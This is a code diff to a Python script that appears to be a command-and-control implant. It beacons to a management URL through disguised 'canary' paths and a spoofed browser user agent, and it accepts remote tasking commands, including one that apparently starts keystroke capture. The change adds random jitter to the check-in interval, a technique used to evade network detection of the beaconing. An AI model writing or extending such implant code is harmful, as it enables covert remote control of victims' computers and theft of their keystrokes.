@@ -23,7 +23,8 @@ keyboard = Controller()
 
 # Globals
 ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
-sleepTime=3
+sleepTime=3.0
+jitter=0.0
 canaryManagementURL = ""
 canaryPath = ["about","feedback","static","terms","articles","images","tags","traffic"]
 canaryEndpoint = ["index.html","contact.php","post.jsp","submit.aspx"]
@@ -124,7 +125,9 @@ def connect(url,managementURL):
             if cmd.startswith("stime:"):
                 command = cmd.replace("stime:", "")
                 global sleepTime
-                sleepTime = command
+                global jitter
+                sleepTime = command.split(":")[0]
+                jitter = command.split(":")[1]
                 return
 
             if cmd.startswith("keystart:"):
@@ -354,6 +357,8 @@ def checkin(url):
 
 def main():
     global canaryManagementURL
+    global sleepTime
+    global jitter
     if canaryManagementURL == "":
         canaryManagementURL = input("[+] Enter Management URL: ")
 
@@ -373,11 +378,17 @@ def main():
 
     while True:
         try:
+            # sleep before checking for new tasking. Add jitter
+            if float(jitter) <= 0:
+                time.sleep(int(sleepTime))
+            else:
+                percent = float(jitter) / 100.0
+                variation = percent * float(sleepTime)
+                modifiedsleep = random.uniform(-variation, variation)
+                time.sleep(float(sleepTime) + modifiedsleep)
             connect(url, canaryManagementURL)
-        except:
+        except Exception as e:
             pass
-        #sleep before checking for new tasking
-        time.sleep(int(sleepTime))
 
 if __name__ == '__main__':
     main()
